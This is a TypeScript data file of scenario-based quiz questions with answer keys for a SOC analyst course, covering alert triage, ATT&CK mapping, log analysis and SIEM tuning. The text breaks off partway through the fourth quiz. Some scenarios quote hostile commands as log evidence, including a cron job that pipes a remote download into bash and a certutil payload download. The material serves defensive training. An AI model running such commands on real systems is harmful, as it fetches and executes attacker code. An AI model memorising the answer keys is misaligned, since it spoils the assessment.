export interface QuizQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  /** Optional scenario block rendered as monospace context above the question (logs, alerts, PCAP, etc.). */
  scenario?: string;
  /** Optional tags shown as small chips (e.g. MITRE tactic, tool, difficulty). */
  tags?: string[];
  /** Optional difficulty for filtering/balance. */
  difficulty?: "easy" | "medium" | "hard";
}

export interface QuizData {
  quizId: string;
  courseId: string;
  title: string;
  description: string;
  questions: QuizQuestion[];
  passingScore: number;
  timeLimit?: number; // in minutes
}

import { sapPart1 } from "@/data/quizzes/sapPart1";
import { sapPart2 } from "@/data/quizzes/sapPart2";
import { sapPart3 } from "@/data/quizzes/sapPart3";
import { sapPart4 } from "@/data/quizzes/sapPart4";
import { finalExams } from "@/data/quizzes/finalExams";
import { socFinalExam } from "@/data/quizzes/socFinalExam";

const baseQuizzes: QuizData[] = [
  {
    quizId: "q1",
    courseId: "soc-fundamentals",
    title: "SOC Operations: Triage & Decision Making",
    description: "Scenario-driven assessment covering SOC roles, escalation logic, metrics, and shift-handover decisions a Tier 1 analyst faces daily.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q1-1",
        difficulty: "easy",
        tags: ["SOC Roles", "Escalation"],
        scenario: "07:42 — You are the only Tier 1 analyst on shift. The SIEM fires three alerts within 30 seconds:\n  1) Brute-force lockout on a service account (low confidence)\n  2) EDR: suspicious child process spawned by winword.exe on FIN-HR-04\n  3) Failed login from a corporate VPN IP for the CFO\nA Tier 2 responder is online; the SOC Manager is in a meeting.",
        question: "Which alert should you triage FIRST, and what is the correct first action?",
        options: [
          "Alert 2 — isolate FIN-HR-04 via EDR and investigate the parent/child chain.",
          "Alert 1 — reset the service account password immediately to stop brute force.",
          "Alert 3 — contact the CFO immediately to verify the corporate VPN login status.",
          "Process all alerts chronologically to maintain strict queue triage discipline."
        ],
        correctAnswer: 0,
        explanation: "Alert 2 has the highest potential impact: an Office process spawning a suspicious child is a classic macro/maldoc execution pattern (T1566.001 → T1059). Containment via EDR isolation buys time without destroying evidence. Alert 1 looks like a misconfigured service, Alert 3 is a single failed login. Resetting the service password (B) destroys context; calling the CFO first (C) wastes minutes during a possible active intrusion; FIFO triage (D) ignores severity — the cardinal sin of Tier 1."
      },
      {
        id: "q1-2",
        difficulty: "medium",
        tags: ["Metrics", "MTTD", "MTTR"],
        scenario: "Monthly SOC report:\n  • Avg time from log ingestion → alert fired: 4 min\n  • Avg time from alert fired → analyst acknowledges: 38 min\n  • Avg time from acknowledgement → containment: 22 min\n  • Avg time from containment → full recovery: 6 hours",
        question: "Which metric is the SOC's biggest weakness, and which control most directly improves it?",
        options: [
          "MTTD — invest in more detection rules and external threat intelligence feeds.",
          "MTTA — review staffing levels, alert routing rules, and on-call rotations.",
          "MTTR — acquire a faster endpoint detection agent with automatic containment.",
          "Recovery time — implement faster server backup and restoration procedures."
        ],
        correctAnswer: 1,
        explanation: "Detection only took 4 minutes, but alerts sat unacknowledged for 38 minutes — that is a Mean Time To Acknowledge (MTTA) problem, almost always rooted in coverage gaps, noisy queues, or poor paging. Adding more rules (A) makes MTTA worse. Faster EDR (C) helps containment, not acknowledgement. Backups (D) address an entirely different phase."
      },
      {
        id: "q1-3",
        difficulty: "medium",
        tags: ["Tiering", "Handover"],
        scenario: "You (T1) have spent 35 minutes on an alert: a user reportedly clicked a phishing link and entered credentials. You confirmed the URL is malicious (VT 12/90), pulled mail headers, and disabled the account. The user mentions \"a weird popup asked me to run a PowerShell command — I did.\"",
        question: "What is the correct next step?",
        options: [
          "Close the case immediately as contained since the account is disabled and the phishing URL is blocked.",
          "Reset the user's password and perform a full workstation reimage yourself to save time and resource.",
          "Escalate to Tier 2 with written handover of indicators, timeline, actions taken, and PowerShell details.",
          "Email the user asking exactly what command they ran on the endpoint, then wait for their response."
        ],
        correctAnswer: 2,
        explanation: "The phishing case has just expanded into possible host compromise (T1059.001 PowerShell). Tier 1 stops at suspected endpoint execution and hands off — but only with a structured handover so Tier 2 doesn't restart the investigation. Closing (A) is negligent; performing reimage yourself (B) breaks tiering and forensic chain of custody; waiting on the user (D) lets the attacker progress."
      },
      {
        id: "q1-4",
        difficulty: "easy",
        tags: ["SOC Models"],
        scenario: "A 400-person fintech runs business hours 09:00–18:00 IST. Compliance requires 24×7 monitoring, but the security budget supports only 3 internal analysts.",
        question: "Which SOC model best fits these constraints?",
        options: [
          "In-house 24×7 SOC — hire five more analysts to cover all night and weekend shifts.",
          "Fully outsourced MSSP — terminate internal team and send all alerts to provider.",
          "Virtual SOC with no dedicated staff — rely on SOAR playbooks and automation only.",
          "Hybrid SOC — internal team covers business hours; MSSP covers nights and weekends."
        ],
        correctAnswer: 3,
        explanation: "Hybrid is the standard fit for mid-size orgs needing 24×7 coverage without the headcount for it. Internal staff retain context and tuning ownership; the MSSP provides eyes-on-glass after hours. (A) blows the budget; (B) loses institutional knowledge; (C) ignores that automation alone cannot triage novel incidents."
      },
      {
        id: "q1-5",
        difficulty: "medium",
        tags: ["SIEM", "Alert Quality"],
        scenario: "Your SIEM rule \"Multiple Failed Logons\" fires 1,200 times/day. Investigation shows ~95% are from a vulnerability scanner and 4% from a misconfigured monitoring agent. Real incidents account for <1%.",
        question: "What is the BEST response?",
        options: [
          "Tune the rule: exclude known scanner/agent source IPs and accounts, then lower the threshold for remaining traffic.",
          "Delete the noisy detection rule completely from the SIEM because the signal is too noisy to be operationally useful.",
          "Add a second Tier 1 analyst to the shift queue so that all 1,200 generated alerts get manually reviewed daily.",
          "Increase the alert threshold from 5 failures to 500 failures so the rule only triggers in extreme circumstances."
        ],
        correctAnswer: 0,
        explanation: "Allow-list known benign sources so the remaining signal is investigable — this preserves the detection while killing the noise. Deleting (B) loses a valid detection. Throwing analysts at noise (C) is the textbook cause of SOC burnout. Crudely raising the threshold (D) makes real brute-force attempts invisible."
      },
      {
        id: "q1-6",
        difficulty: "hard",
        tags: ["Severity", "Business Context"],
        scenario: "Two alerts at the same time:\n  A) Ransomware-style mass file rename on a developer's laptop (offline backups exist; user is on PTO).\n  B) Unusual outbound TLS to a newly-registered domain from the payment-processing server (handles live card transactions).",
        question: "Which incident is HIGHER severity for the business, and why?",
        options: [
          "Alert A — ransomware on a developer laptop is always a P1 priority because file encryption is irreversible without restoring from corporate backups.",
          "Alert B — payment server beaconing to a new domain risks PCI scope, regulatory fines, and data exfiltration even if the active dwell time is short.",
          "Alert A — Ransomware execution must be handled first because it has an immediate visual impact and represents an active threat to system integrity.",
          "Both alerts are equal; severity should be determined solely by the SIEM detection rule's confidence score and default priority level in the queue."
        ],
        correctAnswer: 1,
        explanation: "Severity is impact × likelihood in business context, not the scariness of the alert name. Ransomware on a single offline-backed laptop with no active user is recoverable. A payment server contacting a newly-registered domain is a textbook C2/exfil pattern against a PCI-scoped asset — potential cardholder data loss and regulatory fines. (A)/(B) over-weight the malware label; (D) ignores asset criticality entirely."
      },
      {
        id: "q1-7",
        difficulty: "medium",
        tags: ["Playbooks", "Process"],
        scenario: "Your SOC has no playbook for \"suspected insider data theft.\" An alert fires: a departing employee downloaded 8 GB from SharePoint to a personal device 2 hours ago.",
        question: "What is the appropriate Tier 1 response?",
        options: [
          "Take no action at all — without an approved playbook for insider threat, Tier 1 analysts do not have the authority to initiate any investigation.",
          "Improvise containment: disable the user's Active Directory account, wipe the personal device remotely, and send an email notification to HR department.",
          "Follow the closest playbook, document all deviations, and immediately notify the SOC lead and HR/Legal to handle employee privacy and evidence rules.",
          "Open a low-severity tracking ticket in the system and wait for a formal insider threat playbook to be written and approved by the management team."
        ],
        correctAnswer: 2,
        explanation: "Real SOCs never have a playbook for every scenario. Use the closest playbook as a scaffold, document deviations for post-incident review, and pull in HR/Legal early because insider cases have employment-law and evidence implications. (A) and (D) are negligent; (B) skips legal — wiping a personal device or unilaterally acting on a departing employee can create liability."
      },
      {
        id: "q1-8",
        difficulty: "hard",
        tags: ["False Positive vs True Positive"],
        scenario: "EDR alert: \"Credential dumping behavior on DC01\" — LSASS access by procdump.exe.\nFurther context: the change ticket CHG-4471 shows the AD team scheduled a memory capture for performance troubleshooting in this exact window. The user account matches a domain admin on the ticket.",
        question: "How do you classify and close this alert?",
        options: [
          "True Positive — any LSASS access represents credential dumping behavior; you must immediately isolate the affected DC01 controller and initiate the incident response protocol.",
          "False Positive — immediately close the alert with no notes or documentation since the approved active change ticket explains the administrative behavior on the server.",
          "Unknown behavior — escalate the alert to Tier 3 threat hunters because LSASS access is too high risk for a Tier 1 analyst to judge or document without senior assistance.",
          "Benign True Positive — the behavior occurred and is suspicious, but is authorized; document the change ticket, verify the user, and tune suppression for the approved window."
        ],
        correctAnswer: 3,
        explanation: "This is the classic Benign True Positive (BTP). The detection worked correctly — the activity matches credential dumping — but it is authorized. Closing as plain FP (B) destroys the audit trail and lets a real attacker hide behind future \"change windows.\" Always: verify the ticket, verify the user identity, document, and add a time-boxed tuning suppression. (A) ignores context; (C) escalates unnecessarily."
      },
      {
        id: "q1-9",
        difficulty: "medium",
        tags: ["Logging", "Visibility"],
        scenario: "During an investigation you need to know which process opened a specific outbound TCP connection on a Windows host 3 days ago. The host forwards: Security log, Application log, System log. EDR retention is 24 hours.",
        question: "What is the MOST likely outcome and the correct lesson learned?",
        options: [
          "You cannot recover this data; this is a telemetry gap due to missing Sysmon Event ID 3 and short EDR retention. You should recommend deploying Sysmon and extending EDR retention.",
          "The default Windows Security log will show the process name — Windows logs all process-to-network mapping events by default without any third-party tools or configuration.",
          "Pull the perimeter firewall log — network firewalls inspect all packets and always record the exact originating process name and parent path for every outbound TCP connection.",
          "Reconstruct the timeline from internal DNS resolver logs — DNS queries and responses always include the name of the local process that initiated the original socket request."
        ],
        correctAnswer: 0,
        explanation: "Out-of-the-box Windows does NOT log process→network mapping. Sysmon Event ID 3 is the standard control; without it, and with only 24h EDR retention, the data is gone. Firewall logs (C) see source IP/port, not process name. DNS responses (D) carry no process attribution. Recognizing telemetry gaps is a core SOC competency — the lesson is more important than the failed lookup."
      },
      {
        id: "q1-10",
        difficulty: "hard",
        tags: ["Communication", "Stakeholders"],
        scenario: "You are 90 minutes into an active incident. The CEO walks into the SOC and asks: \"Are we breached? Should I call the board?\"",
        question: "What is the correct response?",
        options: [
          "\"Yes, we are breached — call the board immediately.\" — provide a decisive and quick answer to show that the SOC is on top of the situation and taking charge.",
          "\"We have confirmed intrusion on two endpoints. Scope is being determined; no exfil evidence yet. Next update in 30m. Incident Commander drives board alerts.\" — facts and routing.",
          "\"No, everything is completely under control.\" — reassure the CEO to prevent leadership panic and protect the company from premature disclosure actions.",
          "\"I cannot comment on active investigations, please email the SOC manager.\" — follow strict communication guidelines to avoid releasing unauthorized details."
        ],
        correctAnswer: 1,
        explanation: "Executives need three things: what is known, what is unknown, and when the next update is coming. Overstating (A) triggers premature regulatory disclosures; understating (C) destroys trust if proven wrong; refusing to communicate (D) drives executives to make decisions without you. Always route formal notifications through the Incident Commander to preserve a single source of truth."
      },
      {
        id: "q1-11",
        difficulty: "medium",
        tags: ["Shift Handover"],
        scenario: "End of your night shift. Open items:\n  • INC-204: ongoing phishing investigation, awaiting email gateway logs (ETA 09:00)\n  • INC-208: contained ransomware on one host, eradication pending\n  • 14 alerts in the triage queue, oldest is 11 minutes old",
        question: "Which handover entry is BEST for INC-208?",
        options: [
          "\"INC-208 — ransomware host, handled.\" — keep the entry short and concise to save reading time for the incoming day shift analysts during handover.",
          "\"INC-208 — see the ticketing system for details.\" — instruct the day shift to read the incident log directly to avoid copying information during handover.",
          "\"INC-208 — host LAPTOP-22 isolated via EDR. Account disabled. Eradication pending assignment to endpoint team. No lateral movement. Day shift: confirm reimage.\"",
          "\"INC-208 — ransomware incident is active. Day shift please take over immediately as we are at the end of our shift.\" — route task directly without detail."
        ],
        correctAnswer: 2,
        explanation: "A good handover is self-contained: what happened, what is done, what is pending, who owns it, and what the next shift must do. Vague entries (A/B/D) force the next analyst to restart the investigation — exactly the failure mode SOC handovers exist to prevent."
      },
      {
        id: "q1-12",
        difficulty: "hard",
        tags: ["Threat Intel", "Pyramid of Pain"],
        scenario: "A threat-intel partner shares three indicators tied to APT-X:\n  1) IP address 45.142.x.x (C2 server, observed last week)\n  2) SHA-256 of a custom loader DLL\n  3) TTP: scheduled task named \"OneDriveSync\" calling rundll32 with a .log extension",
        question: "Per the Pyramid of Pain, which indicator gives you the MOST durable detection value, and what should you do with it?",
        options: [
          "The IP — block it at the firewall perimeter; attackers rarely change their command and control infrastructure IPs due to setup and registration costs.",
          "The file hash — add it to the global EDR blocklist; malware hashes represent a unique identifier that never changes across different target systems.",
          "All three are equally durable; you should ingest them as-is directly into the SIEM threat intelligence feed for automatic matching on network logs.",
          "The TTP — write a behavioral detection rule; attackers can easily rotate IPs and recompile binaries but changing their tradecraft is very expensive."
        ],
        correctAnswer: 3,
        explanation: "David Bianco's Pyramid of Pain ranks indicators by how painful they are for the adversary to change. Hashes and IPs are trivially rotated; TTPs require re-tooling. The IP and hash still go into the SIEM/EDR (low cost, short-term win), but the high-value, long-lived detection is the behavioral one. (A)/(B) understate adversary agility; (C) misses the entire point of the model."
      }
    ]
  },
  {
    quizId: "q2",
    courseId: "soc-fundamentals",
    title: "Threat Landscape & Adversary Analysis",
    description: "Scenario-driven assessment on attribution, TTPs, MITRE ATT&CK mapping, and threat-actor decision making for Tier 1/2 analysts.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q2-1",
        difficulty: "medium",
        tags: ["Attribution", "APT", "TTPs"],
        scenario: "Your CTI team shares the following observations from a recent intrusion at a defense contractor:\n- Initial access: spear-phish (DOCX with macro) to a single engineering lead\n- C2: HTTPS beacon to a Cloudflare-fronted domain, 8h jitter, low-and-slow\n- Tooling: custom .NET loader, Cobalt Strike beacon, Mimikatz variant compiled in 2025\n- Dwell time before exfil: 47 days\n- Targeted data: CAD files and contract bids only",
        question: "Based on these observations, which actor class is the BEST fit and why?",
        options: [
          "Nation-state / APT — patient dwell time, narrow target selection, custom tooling, and intellectual-property focus.",
          "Script kiddie — Cobalt Strike is freely available on GitHub and the spear-phishing macro lure is highly generic.",
          "Hacktivist — defense contractors are common political targets for hacktivist groups seeking to make a statement.",
          "Financially motivated cybercrime — Mimikatz usage indicates credential theft for direct resale on dark web forums."
        ],
        correctAnswer: 0,
        explanation: "Long dwell time, surgical targeting (one engineer, one data type), bespoke loader, and theft of competitive IP — not credentials or money — are textbook APT indicators. Cobalt Strike + Mimikatz are commodity tools but the operational discipline (jitter, fronting, narrow scope) shows tradecraft beyond crimeware."
      },
      {
        id: "q2-2",
        difficulty: "medium",
        tags: ["MITRE ATT&CK", "Mapping"],
        scenario: "An analyst observes:\n  parent: outlook.exe -> child: winword.exe -> child: powershell.exe -hidden -enc <base64>\nNetwork: powershell.exe -> 185.x.x.x:443 (rare destination)",
        question: "Which ATT&CK technique chain BEST describes this behavior?",
        options: [
          "T1078 Valid Accounts -> T1021 Remote Services -> T1059.001 PowerShell -> T1486 Data Encrypted for Impact.",
          "T1566.001 Spearphishing Attachment -> T1204.002 User Execution -> T1059.001 PowerShell -> T1071.001 Web Protocols C2.",
          "T1190 Exploit Public-Facing Application -> T1505.003 Web Shell -> T1059.001 PowerShell -> T1071.001 Web Protocols C2.",
          "T1110 Brute Force -> T1078 Valid Accounts -> T1059.001 PowerShell -> T1003.001 OS Credential Dumping LSASS."
        ],
        correctAnswer: 1,
        explanation: "Outlook spawning Word spawning encoded PowerShell that beacons out is the canonical phishing-attachment chain: delivery (T1566.001), user opens it (T1204.002), macro launches PowerShell (T1059.001), and C2 over HTTPS (T1071.001). Mapping observed telemetry to the exact ATT&CK IDs is a core Tier 1/2 skill."
      },
      {
        id: "q2-3",
        difficulty: "hard",
        tags: ["BEC", "Triage"],
        scenario: "At 09:14, the CFO forwards an email she 'thinks is suspicious.' The message is from cfo@yourcompany.co (note .co) and asks the AP clerk to push a $480k wire to a new vendor before EOD. Mail logs show the message was sent from 198.51.100.22 (Lithuania), SPF=fail, DMARC=quarantine but the gateway delivered it because the AP clerk's mailbox has an allow-list rule for 'cfo@yourcompany.*'.",
        question: "What is the MOST important immediate action?",
        options: [
          "Block the sender source IP address at the perimeter firewall immediately, then close the ticket as contained to clear queue.",
          "Reply-all to the email thread warning all internal corporate users not to click or interact with the malicious message.",
          "Confirm with AP that no wire has been initiated, remove the over-broad allow-list rule, and recall the message tenant-wide.",
          "Submit the malicious sender domain to VirusTotal, check the reputation database, and wait for community votes to update."
        ],
        correctAnswer: 2,
        explanation: "BEC triage priority: (1) stop financial loss — verify no wire is in-flight, (2) eliminate the control gap that bypassed SPF/DMARC (the wildcard allow-list), (3) purge the message from all mailboxes. Firewall IP blocks are nearly useless for email; the cheap fix is fixing the mail rule and recalling the message."
      },
      {
        id: "q2-4",
        difficulty: "medium",
        tags: ["Supply Chain", "Risk"],
        scenario: "Your vulnerability feed reports that a popular JS package your e-commerce site loads via CDN had a malicious version published last night that exfiltrates form data. Your site pins '^1.2.0' and rebuilds nightly.",
        question: "Which response is correct AND properly scoped?",
        options: [
          "Take no action at all — CDN providers will automatically handle the compromise and rollback the package on their side.",
          "Disable the entire e-commerce site immediately until the NPM package author replies to your security team request.",
          "Block the external CDN domain at the perimeter firewall to prevent any script execution on customer browsers.",
          "Pin to last known-good version, redeploy, and implement CSP and SRI policies to prevent unauthorized script tampering."
        ],
        correctAnswer: 3,
        explanation: "Caret-range pinning (`^1.2.0`) auto-upgrades and is the actual root cause. Pin exact, redeploy, and add Subresource Integrity (SRI) + Content-Security-Policy so a future tampered script can't execute. This is the SolarWinds / event-stream class lesson."
      },
      {
        id: "q2-5",
        difficulty: "hard",
        tags: ["Insider Threat", "Behavioral"],
        scenario: "A senior developer in his notice period:\n- Logged in at 02:30 on a Sunday (first time ever off-hours)\n- Cloned 14 private repos to a personal laptop via GitHub PAT\n- Sent 6 GB to a personal Google Drive 12 minutes later\n- Has legitimate access to every repo touched",
        question: "How should you classify this and what is the right first action?",
        options: [
          "True positive insider threat — preserve evidence, revoke PAT and SSO sessions, and engage HR/Legal before confronting the user.",
          "False positive event — the developer has legitimate access to all repositories, so this activity is not a policy violation.",
          "Active malware infection — initiate the incident response protocol immediately and perform a full reimage of his workstation.",
          "Benign administrative activity — wait until the user returns on Monday morning to ask him about the bulk repository clones."
        ],
        correctAnswer: 0,
        explanation: "Authorized access does not equal authorized use. The off-hours pattern + bulk clone + immediate cloud upload + notice-period context is classic intentional exfiltration. The procedural order matters: evidence first, contain identity, loop HR/legal — never tip off the subject."
      },
      {
        id: "q2-6",
        difficulty: "medium",
        tags: ["Credential Attacks"],
        scenario: "Azure AD sign-in logs over 1 hour:\n- 14,200 failed logins\n- Across 9,800 distinct usernames\n- Same 3 passwords tried: 'Winter2026!', 'Company@123', 'Welcome1'\n- Source: 4 residential proxy ASNs",
        question: "This is BEST described as which attack, and which control most directly mitigates it?",
        options: [
          "Brute force on one account — configure account lockout thresholds on Active Directory.",
          "Password spraying — enable MFA, risk-based conditional access, and ban common passwords.",
          "Credential stuffing — enable MFA and implement compromised password database screening.",
          "Phishing attack — deploy external email banner warnings and schedule security training."
        ],
        correctAnswer: 1,
        explanation: "Few passwords across many accounts = spraying (designed to stay below per-account lockout). Stuffing would use leaked username:password pairs (1:1). MFA + conditional access on impossible travel/unfamiliar location + banned-password lists are the mitigations the framework explicitly recommends."
      },
      {
        id: "q2-7",
        difficulty: "hard",
        tags: ["Pyramid of Pain", "CTI"],
        scenario: "After containing an intrusion, you have these artifacts:\n  A) MD5 of dropper: 5d41402abc4b2a76b9719d911017c592\n  B) C2 IP: 203.0.113.45\n  C) C2 domain: secure-update[.]net\n  D) Tool: 'Cobalt Strike Malleable C2 profile mimicking Office365 traffic'\n  E) TTP: 'phishing -> macro -> PowerShell -> CS beacon over HTTPS jitter 30%'",
        question: "Which artifact would cause the MOST 'pain' to the adversary if you block/detect on it, per the Pyramid of Pain?",
        options: [
          "Artifact A (dropper hash) — file hashes represent the most unique indicator that is extremely easy to block globally via EDR.",
          "Artifact B (C2 IP) — IP addresses represent physical server infrastructure that is relatively difficult for an actor to rotate.",
          "Artifact E (TTP) — behavioral tradecraft is at the top of the pyramid; changing techniques is far harder than rotating IPs.",
          "Artifact C (C2 domain) — domains require DNS registration and reputation aging, making them very painful to replace quickly."
        ],
        correctAnswer: 2,
        explanation: "Bianco's Pyramid of Pain: hashes/IPs/domains are trivial-to-easy to rotate; tools annoying; TTPs are 'tough!' because they force the adversary to rebuild tradecraft. Tier 2/3 detection engineering should prioritize behavioral signatures over IOCs."
      }
    ]
  },
  {
    quizId: "q3",
    courseId: "soc-fundamentals",
    title: "Log Analysis & Triage Challenge",
    description: "Hands-on triage using real Windows, Linux, and proxy/firewall log excerpts.",
    passingScore: 75,
    timeLimit: 30,
    questions: [
      {
        id: "q3-1",
        difficulty: "medium",
        tags: ["Windows", "EventID 4625", "Brute Force"],
        scenario: "Security.evtx excerpt:\n  04:12:01  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  04:12:03  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  ... (192 entries over 6 minutes, same source, same account)\n  04:18:11  4624  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21",
        question: "What occurred?",
        options: [
          "Successful brute force / password guess against svc_backup service account from an internal host.",
          "Service restart loop — a misconfigured backup service restarting repeatedly is benign activity.",
          "Kerberos ticket expiration — the service account failed to renew its ticket within the active window.",
          "Logon type 3 network connections cannot represent brute force attempts and should be safely ignored."
        ],
        correctAnswer: 0,
        explanation: "Status 0xC000006A = wrong password. 192 failures from one source against one account followed by a 4624 success is unambiguous credential guessing — and the source is INTERNAL (10.0.5.21), suggesting lateral movement or a compromised host. Service accounts are juicy because they often have stale passwords and broad rights."
      },
      {
        id: "q3-2",
        difficulty: "hard",
        tags: ["Linux", "auth.log", "Persistence"],
        scenario: "/var/log/auth.log:\n  Mar 14 23:01 sshd[2210]: Accepted publickey for root from 198.51.100.7 port 51220\n  Mar 14 23:01 sudo: root : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/crontab -e\n  Mar 14 23:02 systemd: Started Session 88 of user root.\nAnd `crontab -l` now shows:\n  */5 * * * * curl -s http://198.51.100.7/u | bash",
        question: "What is the correct classification and immediate containment?",
        options: [
          "Routine administrative work — root user logged in legitimately to perform system troubleshooting, and configured an automated monitoring script via crontab.",
          "Confirmed compromise + persistence: rogue cron pulling a shell. Isolate host, capture memory, remove cron, rotate keys, and hunt the attacker IP fleet-wide.",
          "Misconfigured monitoring agent — an internal utility is generating noise by polling an external update site, we should silence this alert going forward.",
          "Phishing campaign — notify internal users to watch out for suspicious emails asking them to execute system administration commands or upload ssh keys."
        ],
        correctAnswer: 1,
        explanation: "Direct root SSH from an external IP + immediate cron persistence beaconing to that same IP is textbook initial-access + T1053.003 (Cron) persistence. Containment must preserve evidence (memory + auth.log + cron) before remediation, and the hunt step (same key / IP across other hosts) is what separates a real responder from someone who just deletes the cron."
      },
      {
        id: "q3-3",
        difficulty: "medium",
        tags: ["Proxy", "Beaconing"],
        scenario: "Squid access.log — same client, 24h:\n  Requests to https://cdn-metrics[.]xyz/collect: 288\n  Mean interval: 300s, std-dev: 4s\n  Bytes out per request: ~1.2 KB, bytes in: 96 B",
        question: "What pattern is this and what is the correct next step?",
        options: [
          "Normal website analytics traffic — this represents standard telemetry updates to a CDN and the tracking ticket can be closed safely without further actions.",
          "DDoS attack traffic — the host is trying to overwhelm an external service using high-frequency requests, we must immediately block the target IP at firewall.",
          "C2 beaconing — low jitter, periodic small payloads; we must pivot on destination across all hosts, check domain age, and identify the initiating local process.",
          "Software update check — a local application is checking for available patches at a periodic interval and the connection attempts can be ignored by analysts."
        ],
        correctAnswer: 2,
        explanation: "Tight periodicity (300s ± 4s) with asymmetric small payloads is the signature of automated beaconing, not human or analytics traffic. The pivot pattern (other clients hitting the same destination, domain WHOIS age, process attribution via EDR) is the standard hunt loop."
      },
      {
        id: "q3-4",
        difficulty: "hard",
        tags: ["Windows", "Sysmon", "LOLBin"],
        scenario: "Sysmon Event ID 1:\n  Image: C:\\Windows\\System32\\certutil.exe\n  CommandLine: certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  User: CORP\\jdoe",
        question: "What is happening?",
        options: [
          "Routine certificate validation — certutil is verifying the local root certificate store and checking CRL distribution points over standard HTTP ports.",
          "Windows Update activity — system process cmd.exe has launched certutil to download package updates from Microsoft CDN servers during a scheduled window.",
          "Antivirus signature refresh — endpoint security agent is using certutil command line switches to retrieve updated definition files from signature server.",
          "LOLBin download (T1105) — certutil is used to download an external file; investigate the parent cmd.exe process origin and isolate the dropped p.exe file."
        ],
        correctAnswer: 3,
        explanation: "certutil with -urlcache -split -f is a well-known LOLBin pattern to fetch a remote payload while bypassing some egress monitoring. Map to T1105 + T1218 abuse. Pivot to discover what spawned cmd.exe — that's often the real entry point."
      },
      {
        id: "q3-5",
        difficulty: "medium",
        tags: ["Firewall", "Data Exfil"],
        scenario: "Palo Alto traffic log, single internal workstation, last hour:\n  app=dns  dst=8.8.8.8  bytes_out=412,000,000  sessions=14,902  avg_query_len=180\n  app=web-browsing dst=mixed bytes_out=2,100,000",
        question: "What is the likely activity?",
        options: [
          "DNS tunneling / exfiltration over port 53 — large query volume with long subdomain names; isolate the host and capture a network packet dump.",
          "Heavy web browsing — the user is visiting dynamic websites that load resources from many CDNs, leading to high-volume DNS lookup requests.",
          "DNS cache poisoning attempt — an external server is trying to inject malicious records into the internal DNS server cache to redirect traffic.",
          "Normal operating system patching activity — automated update agent is querying domain records to locate nearby file distribution servers."
        ],
        correctAnswer: 0,
        explanation: "412 MB of outbound DNS in an hour with 180-byte average query length is far outside normal. DNS is rarely inspected and frequently allowed outbound — making it the favorite covert channel. The correct response is host isolation + packet capture for forensics, plus a DNS-volume detection going forward."
      },
      {
        id: "q3-6",
        difficulty: "hard",
        tags: ["Correlation"],
        scenario: "Three alerts within 14 minutes from the SAME endpoint (HOST-44):\n  A) EDR: suspicious WMI subscription created\n  B) AD: HOST-44$ enumerated all Domain Admins via LDAP\n  C) Firewall: SMB (445/tcp) to 23 other internal hosts that HOST-44 has never talked to before",
        question: "What is the BEST interpretation?",
        options: [
          "Three unrelated low-severity events — these occurred independently and do not represent a coordinated threat, close as separate benign findings.",
          "Active intrusion — WMI persistence, LDAP discovery, and SMB lateral sweep; escalate to incident response team and isolate host HOST-44 immediately.",
          "Vulnerability scanner activity — an authorized internal scanner is performing a scheduled audit of local workstations and active active directory hosts.",
          "System administrator performing inventory — IT staff is executing active directory queries and connecting to remote servers to collect asset details."
        ],
        correctAnswer: 1,
        explanation: "Individually these are 'meh.' Correlated they form Persistence -> Discovery -> Lateral Movement on the kill chain — the unmistakable middle game of a real intrusion. SOC value lives in correlation, not single-alert handling."
      }
    ]
  },
  {
    quizId: "q4",
    courseId: "soc-fundamentals",
    title: "SIEM & Alert Triage in Practice",
    description: "Scenario quiz on writing, tuning, and triaging SIEM detections.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q4-1",
        difficulty: "medium",
        tags: ["Tuning", "False Positives"],
        scenario: "Detection 'Mass File Access' fires 480 times/day. Review shows 96% come from three backup service accounts running nightly snapshots and the SCCM scanner.",
        question: "What is the correct tuning approach?",
        options: [
          "Add precise allow-list (named accounts and time windows), document suppression with expiry/review date, and keep active for other systems.",
          "Disable the detection rule entirely in the SIEM since it generates too many false positives and is not operationally useful for analysts.",
          "Raise the alert severity level to Critical so that analysts prioritize triaging these alerts ahead of other events in the active queue.",
          "Mute all email notifications and ticket creation templates for the specific user mailbox of whoever complained about the alert noise."
        ],
        correctAnswer: 0,
        explanation: "Good tuning suppresses *only* the known-benign context (named accounts + time window), not the entire rule. Always document suppressions with an owner and review date so they don't become permanent blind spots."
      },
      {
        id: "q4-2",
        difficulty: "hard",
        tags: ["Splunk", "SPL"],
        scenario: "You need to detect users authenticating from two different countries within 1 hour ('impossible travel').",
        question: "Which Splunk approach is MOST correct?",
        options: [
          "`index=auth | stats count by user` — returns simple authentication counts per user that the analyst must manually review for geographic anomalies.",
          "`index=auth | bin _time span=1h | iplocation src_ip | stats dc(Country) as countries by user, _time | where countries>1` — bins time before counting.",
          "`index=auth action=success | iplocation src_ip | stats dc(Country) as countries values(Country) as c by user _time | where countries>1` — no time bin.",
          "`index=auth | head 100` — returns the first 100 events in the authentication index to allow the analyst to visually inspect source IP addresses."
        ],
        correctAnswer: 1,
        explanation: "Option B buckets time into 1h windows BEFORE counting distinct countries per user — the correct semantic for 'within 1 hour.' Option C without a time bucket lumps the whole search range and produces noisy true-but-useless positives. Detection engineering requires the query to match the English."
      },
      {
        id: "q4-3",
        difficulty: "medium",
        tags: ["Triage", "Severity"],
        scenario: "Three alerts hit your queue simultaneously at 14:00:\n  1) IDS: Nmap SYN scan from 192.0.2.10 -> 10.0.0.0/24\n  2) EDR: ransomware behavioral block on FIN-DB-01 (production financial DB)\n  3) DLP: 1 customer record copied to USB on HR laptop",
        question: "Correct triage order?",
        options: [
          "Triage order 1, 2, 3 — process alerts chronologically in the exact order they arrived in the queue.",
          "Triage order 3, 1, 2 — prioritize alphabetically by alert name to maintain consistent naming sorting.",
          "Triage order 2, 3, 1 — prioritize by impact: database ransomware first, DLP next, and network recon last.",
          "Triage order based on complexity — process whichever alert has the fewest fields to analyze first."
        ],
        correctAnswer: 2,
